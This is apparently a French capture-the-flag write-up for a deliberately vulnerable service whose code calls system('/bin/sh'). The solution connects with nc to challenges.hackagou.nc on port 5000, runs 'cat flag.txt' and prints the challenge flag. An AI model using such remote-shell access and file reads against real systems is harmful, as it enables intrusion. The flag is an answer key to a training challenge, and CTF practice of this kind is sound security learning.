# WriteUp

## Analyse du code

Le code source est assez explicite, nous obtenons directement un shell en se connectant au service grâce à l'appel ```system("/bin/sh");```.

## Exploit

Pour exploiter ce service, il suffit de s'y connecter :

```nc challenges.hackagou.nc 5000```

Puis de taper :

```cat flag.txt```

```bash
❯ nc challenges.hackagou.nc 5000

L'esprit attend...

Quel geste souhaitez-vous faire ?
cat flag.txt
OPENNC{L3_Gu3RR13r_b0ug3_37_53_m3U7!!}
```